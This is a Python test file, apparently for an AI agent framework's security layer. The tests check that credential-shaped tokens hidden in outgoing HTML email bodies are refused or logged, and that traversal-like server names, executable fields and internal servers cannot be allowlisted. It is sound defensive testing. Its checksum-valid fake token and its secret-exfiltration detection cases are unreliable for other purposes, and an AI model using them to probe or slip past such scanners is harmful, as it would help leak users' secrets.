        big = {**params, field: _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)}
        approved, error = await _resolve(_event(big, server=server, tool=tool))
        assert approved is False
        assert "too large" in error
        assert "Settings > Security" not in error
        assert mbf.size_refusals() == []

    @pytest.mark.parametrize("server", ["kirocrew-core", "kirocrew-cron", "kirocrew-anything"])
    def test_a_kirocrew_server_is_not_a_valid_row(self, server) -> None:
        assert mbf.is_valid_row(server, "cron_add", "message") is False
        mbf.record_size_refusal(server, "cron_add", "message")
        assert mbf.size_refusals() == []

    def test_a_stored_kirocrew_row_is_dropped_on_read(self, tmp_path) -> None:
        rows = [
            {"server": "kirocrew-cron", "tool": "cron_add", "field": "message"},
            {"server": "mail", "tool": "send", "field": "html"},
        ]
        (tmp_path / "mcp_body_fields.json").write_text(json.dumps({"fields": rows}))
        assert [r["server"] for r in mbf.owner_rows()] == ["mail"]
        assert mbf.body_field_keys("cron_add", "kirocrew-cron") == frozenset()
        assert mbf.body_field_keys("send", "mail") == frozenset({"html"})

    @pytest.mark.parametrize("server", ["kirocrewcore", "my-kirocrew-core", "crew-core"])
    def test_a_third_party_name_is_still_a_valid_row(self, server) -> None:
        assert mbf.is_valid_row(server, "send", "html") is True


class TestTheStore:
    def test_a_malformed_store_reads_as_no_rows(self, tmp_path) -> None:
        (tmp_path / "mcp_body_fields.json").write_text("{not json", encoding="utf-8")
        assert mbf.owner_rows() == []

    def test_invalid_rows_are_dropped_on_read(self, tmp_path) -> None:
        rows = [
            {"server": "mail", "tool": "send", "field": "html"},
            {"server": "mail", "tool": "send", "field": "a.b"},
            {"server": "", "tool": "send", "field": "html"},
        ]
        (tmp_path / "mcp_body_fields.json").write_text(json.dumps({"fields": rows}))
        assert [r["field"] for r in mbf.owner_rows()] == ["html"]

    @pytest.mark.parametrize("change", ["add", "remove"])
    def test_an_unreadable_store_is_not_rewritten(self, tmp_path, change) -> None:
        store = tmp_path / "mcp_body_fields.json"
        kept = {"fields": [{"server": "docs", "tool": "create_page", "field": "markdown"}]}
        store.write_text(json.dumps(kept), encoding="utf-8")
        row = mbf.BodyField("docs", "create_page", "markdown" if change == "remove" else "html")
        fail = OSError(errno.EIO, "I/O error")
        with patch.object(type(store), "read_text", side_effect=fail), pytest.raises(OSError):
            (mbf.add_owner_row if change == "add" else mbf.remove_owner_row)(row)
        assert json.loads(store.read_text(encoding="utf-8")) == kept

    def test_a_change_rewrites_the_existing_store_in_place(self, tmp_path) -> None:
        # A running Linux sandbox bind-mounts this inode read-only; a rename over it
        # would detach that mount and leave the new file writable inside the sandbox.
        store = tmp_path / "mcp_body_fields.json"
        store.write_text("{}", encoding="utf-8")
        inode = store.stat().st_ino
        row = mbf.BodyField("docs", "create_page", "markdown")
        assert mbf.add_owner_row(row) is True
        assert store.stat().st_ino == inode
        assert [r["field"] for r in mbf.owner_rows()] == ["markdown"]
        assert mbf.remove_owner_row(row) is True
        assert store.stat().st_ino == inode
        assert json.loads(store.read_text(encoding="utf-8")) == {"fields": []}

    def test_the_first_change_creates_the_store(self, tmp_path) -> None:
        assert mbf.add_owner_row(mbf.BodyField("docs", "create_page", "markdown")) is True
        assert [r["field"] for r in mbf.owner_rows()] == ["markdown"]
        assert (tmp_path / "mcp_body_fields.json").exists()

    def test_a_default_row_is_not_stored_twice(self) -> None:
        assert mbf.add_owner_row(mbf.DEFAULT_BODY_FIELDS[0]) is False
        assert mbf.owner_rows() == []

    def test_the_store_leaf_is_fenced(self) -> None:
        from kiro_crew import sandbox
        from kiro_crew.security.paths_lists import _CREW_SECRET_LEAVES

        assert "mcp_body_fields.json" in _CREW_SECRET_LEAVES
        assert "mcp_body_fields.json" in sandbox._CREW_READONLY_LEAVES
        assert "mcp_body_fields.json" in sandbox._CREW_PRECREATE_READONLY_FILE_LEAVES


class TestAnHtmlMailIsNotACredential:
    @pytest.mark.asyncio
    async def test_an_inline_image_is_allowed(self, warnings) -> None:
        import base64
        import hashlib

        blob = b"".join(hashlib.sha256(str(i).encode()).digest() for i in range(256))
        image = base64.b64encode(blob).decode()
        body = f'<p>Chart:</p><img src="data:image/png;base64,{image}">' + _html(30 * 1024)
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is True, error
        assert warnings() == []

    @pytest.mark.asyncio
    async def test_a_key_in_an_html_body_is_refused(self, warnings) -> None:
        body = f"<p>Use this key: {_KEY}</p>" + _html(30 * 1024)
        await _refused_with_warning(body, warnings, "credential")

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "template",
        [
            '<img src="data:image/png;base64,{image}" alt="{key}">',
            '<img src="data:image/png;base64,{image}">{key}',
            '<a href="#">{key}</a><img src="data:image/png;base64,{image}">',
        ],
    )
    async def test_a_key_next_to_an_inline_image_is_still_refused(self, template, warnings) -> None:
        body = template.format(image=_image(), key=_KEY) + _html(30 * 1024)
        await _refused_with_warning(body, warnings, "credential")

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "body",
        [
            "Hi team,\n\nThe weekly report is attached.\n\nThanks,\nRay",
            '<p>See <a href="https://example.com/report?id=42&utm_source=mail">the report</a>.</p>',
            '<a href="https://list.example.com/unsubscribe?u=8f14e45fceea167a5a36dedd4bea2543">Unsubscribe</a>',
            "Fixed in commit 2c4f6d7c9b1a3e5f7a9b1c3d5e7f9a1b3c5d7e9f.",
            "Logs are in ~/project/logs/run.txt on my machine.",
        ],
    )
    async def test_an_ordinary_short_body_still_passes(self, body, warnings) -> None:
        # Under 20 KiB a body passed the old full scan; it still passes, and no
        # credential or link warning is logged for it.
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is True, error
        assert warnings() == []

    @pytest.mark.asyncio
    @pytest.mark.parametrize("algo", ["sha256", "sha384", "sha512"])
    async def test_an_integrity_digest_is_allowed(self, algo, warnings) -> None:
        import base64
        import hashlib

        digest = base64.b64encode(hashlib.new(algo, b"public-example-0").digest()).decode()
        body = f'<script src="https://cdn.example.com/a.js" integrity="{algo}-{digest}"></script>'
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is True, error
        assert warnings() == []

    @pytest.mark.asyncio
    async def test_a_target_group_arn_is_allowed(self, warnings) -> None:
        arn = (
            "arn:aws:elasticloadbalancing:us-east-1:123456789012:"
            "targetgroup/MyProdWebAppTargetGroupV2/73e2d6bc24d8a067"
        )
        approved, error = await _resolve(_event(_mail(f"<p>Drained {arn} at 09:00.</p>")))
        assert approved is True, error
        assert warnings() == []

    @pytest.mark.asyncio
    async def test_a_key_next_to_an_integrity_digest_is_still_logged(self, warnings) -> None:
        import base64
        import hashlib

        digest = base64.b64encode(hashlib.sha256(b"public-example-0").digest()).decode()
        body = f'<script integrity="sha256-{digest}"></script> key: {_KEY}'
        await _passes_with_warning(body, warnings, "credential")

    @pytest.mark.asyncio
    async def test_a_shared_document_link_is_allowed(self, warnings) -> None:
        link = "https://docs.google.com/document/d/" + _DOC_ID + "/edit?usp=sharing"
        body = f'<p>Notes: <a href="{link}">doc</a></p>' + _html(30 * 1024)
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is True, error
        assert warnings() == []

    @pytest.mark.asyncio
    async def test_a_key_next_to_a_document_link_is_still_refused(self, warnings) -> None:
        link = "https://docs.google.com/document/d/" + _DOC_ID + "/edit"
        body = f'<a href="{link}">doc</a> key: {_KEY}' + _html(30 * 1024)
        await _refused_with_warning(body, warnings, "credential")

    @pytest.mark.asyncio
    async def test_a_key_written_as_a_data_payload_is_refused(self, warnings) -> None:
        # A data URI payload is judged as text.
        body = f'<img src="data:image/png;base64,{_KEY}">' + _html(28 * 1024)
        await _refused_with_warning(body, warnings, "credential")


#: A GitHub token with a valid checksum: the rule table reads it by its format.
_KEY = github_classic(seed=331)
#: A Google Docs document id: 44 random-looking characters, which grant nothing.
_DOC_ID = "1IMcAxYmfsB4HbQLXjjlAFbVV6q9rXxtNDFyuzX9k1gn"


def _image() -> str:
    import base64
    import hashlib

    blob = b"".join(hashlib.sha256(str(i).encode()).digest() for i in range(256))
    return base64.b64encode(blob).decode()


# --------------------------------------------------------------- the routes


def _request(*, method: str = "POST", user: str = "owner-1", body=None, query=None):
    from unittest.mock import AsyncMock

    req = MagicMock()
    req.method = method
    req.path = "/api/security/mcp-body-fields"
    store = {"app": "", "user": user}
    req.get = lambda key, default=None: store.get(key, default)
    req.query = query or {}
    req.json = AsyncMock(return_value=body if body is not None else {})
    return req


@pytest.fixture
def _routes(monkeypatch):
    from kiro_crew.dashboard.handlers import mcp_body_fields as routes

    events: list[tuple[str, bool]] = []

    def _record(*, outcome, caller, detail="", critical=False):
        events.append((outcome, critical))
        return True

    monkeypatch.setattr(routes, "_audit", _record)
    monkeypatch.setattr(
        routes, "is_owner_dashboard_request", lambda req: req.get("user") == "owner-1"
    )
    monkeypatch.setattr(
        routes,
        "_owner_denial_response",
        lambda req, msg, code: routes.web.json_response({"code": code}, status=403),
    )
    return routes, events


_ROW = {"server": "mail", "tool": "send", "field": "html"}


class TestTheOwnerRoutes:
    @pytest.mark.asyncio
    async def test_a_non_owner_is_refused_on_every_verb(self, _routes) -> None:
        routes, events = _routes
        mbf.record_size_refusal("mail", "send", "html")
        for handler, method in (
            (routes.api_mcp_body_fields_get, "GET"),
            (routes.api_mcp_body_fields_add, "POST"),
            (routes.api_mcp_body_fields_remove, "DELETE"),
        ):
            resp = await handler(_request(method=method, user="someone", body=_ROW, query=_ROW))
            assert resp.status == 403
        assert mbf.owner_rows() == []
        assert [e[0] for e in events] == ["denied", "denied", "denied"]

    @pytest.mark.asyncio
    async def test_only_a_refused_field_can_be_allowed(self, _routes) -> None:
        routes, _events = _routes
        resp = await routes.api_mcp_body_fields_add(_request(body=_ROW))
        assert resp.status == 409
        assert mbf.owner_rows() == []

    @pytest.mark.asyncio
    async def test_the_owner_allows_and_removes_a_refused_field(self, _routes) -> None:
        routes, events = _routes
        mbf.record_size_refusal("mail", "send", "html")
        listing = json.loads((await routes.api_mcp_body_fields_get(_request(method="GET"))).text)
        assert listing["refused"][0]["field"] == "html"
        resp = await routes.api_mcp_body_fields_add(_request(body=_ROW))
        assert resp.status == 200
        listing = json.loads(resp.text)
        assert [r["field"] for r in listing["owner"]] == ["html"]
        assert listing["refused"] == []
        assert ("added", True) in events
        resp = await routes.api_mcp_body_fields_remove(_request(method="DELETE", query=_ROW))
        assert resp.status == 200
        assert mbf.owner_rows() == []

    @pytest.mark.asyncio
    async def test_config_names_survive_refusal_listing_and_post_parsing(self, _routes) -> None:
        routes, _events = _routes
        rows = [
            {"server": "team:mail", "tool": "send", "field": "html"},
            {"server": "@org/mail", "tool": "send message", "field": "content"},
        ]
        for row in rows:
            mbf.record_size_refusal(row["server"], row["tool"], row["field"])
        assert [(row["server"], row["tool"], row["field"]) for row in mbf.size_refusals()] == [
            ("@org/mail", "send message", "content"),
            ("team:mail", "send", "html"),
        ]

        for row in rows:
            parsed = await routes._row_from(_request(body=row))
            assert parsed == mbf.BodyField(row["server"], row["tool"], row["field"])
            assert (await routes.api_mcp_body_fields_add(_request(body=row))).status == 200
        assert [(row["server"], row["tool"], row["field"]) for row in mbf.owner_rows()] == [
            ("team:mail", "send", "html"),
            ("@org/mail", "send message", "content"),
        ]

        traversal = {"server": "team..mail", "tool": "send", "field": "html"}
        mbf.record_size_refusal(traversal["server"], traversal["tool"], traversal["field"])
        assert all(row["server"] != traversal["server"] for row in mbf.size_refusals())
        assert isinstance(await routes._row_from(_request(body=traversal)), routes.web.Response)

    @pytest.mark.asyncio
    async def test_an_executable_field_cannot_be_allowed_even_if_remembered(self, _routes) -> None:
        routes, events = _routes
        row = {"server": "mail", "tool": "send", "field": "command"}
        # Planted past record_size_refusal, which would not remember it.
        with mbf._REFUSALS_LOCK:
            mbf._REFUSALS[mbf.BodyField("mail", "send", "command")] = "2026-11-10T00:00:00+00:00"
        resp = await routes.api_mcp_body_fields_add(_request(body=row))
        assert resp.status == 400
        assert mbf.owner_rows() == []
        assert ("added", True) not in events

    @pytest.mark.asyncio
    async def test_a_kirocrew_server_cannot_be_allowed_even_if_remembered(self, _routes) -> None:
        routes, events = _routes
        row = {"server": "kirocrew-cron", "tool": "cron_add", "field": "message"}
        # Planted past record_size_refusal, which would not remember it.
        with mbf._REFUSALS_LOCK:
            mbf._REFUSALS[mbf.BodyField(**row)] = "2026-11-14T00:00:00+00:00"
        resp = await routes.api_mcp_body_fields_add(_request(body=row))
        assert resp.status == 400
        assert mbf.owner_rows() == []
        assert ("added", True) not in events

    @pytest.mark.asyncio
    async def test_an_add_whose_audit_fails_does_not_happen(self, _routes, monkeypatch) -> None:
        routes, _events = _routes
        monkeypatch.setattr(routes, "_audit", lambda **kw: False)
        mbf.record_size_refusal("mail", "send", "html")
        resp = await routes.api_mcp_body_fields_add(_request(body=_ROW))
        assert resp.status == 503
        assert mbf.owner_rows() == []

    @pytest.mark.asyncio
    async def test_a_malformed_row_is_refused(self, _routes) -> None:
        routes, _events = _routes
        resp = await routes.api_mcp_body_fields_add(_request(body={**_ROW, "field": "a.b"}))
        assert resp.status == 400

    def test_no_mcp_tool_writes_the_store(self) -> None:
        from pathlib import Path

        import kiro_crew

        pkg = Path(kiro_crew.__file__).resolve().parent
        writers = {
            f.relative_to(pkg).as_posix()
            for f in pkg.rglob("*.py")
            if "add_owner_row(" in f.read_text(encoding="utf-8")
        }
        assert writers == {
            "dashboard/handlers/mcp_body_fields.py",
            "security/mcp_body_fields.py",
        }, writers
